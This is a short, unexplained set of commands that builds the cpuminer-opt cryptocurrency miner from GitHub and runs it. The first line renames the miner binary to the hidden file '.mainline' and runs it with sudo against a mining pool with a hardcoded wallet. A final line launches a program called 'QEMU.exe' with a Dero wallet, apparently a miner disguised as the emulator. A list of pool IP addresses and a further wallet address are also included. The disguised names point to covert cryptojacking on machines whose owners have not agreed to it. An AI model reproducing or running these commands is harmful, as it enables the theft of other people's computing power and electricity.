sudo apt update && sudo apt install autoconf pkg-config libgmp-dev zlib1g-dev libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git -y && git clone https://github.com/glukolog/cpuminer-opt.git && cd cpuminer-opt && chmod +x *.sh && ./autogen.sh && ./configure CFLAGS="-O3 -march=armv8-a+crypto -mtune=cortex-a53" --with-curl --with-crypto && make -j2 && mv cpuminer .mainline && sudo ./.mainline -a yespower -o stratum+tcp://yespower.mine.zergpool.com:6533 -O D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n:ID=cpuX,c=DOGE,mc=BTE,refcode=78f6ec9427d56069f93709d7805a6a56

103.249.70.7:7148,149.56.111.148:7148,51.79.251.11:7148,141.95.55.97:7148
LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc

QEMU.exe --wallet-address dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c --daemon-rpc-address dero-node-orionure-sg.mysrv.cloud:10300
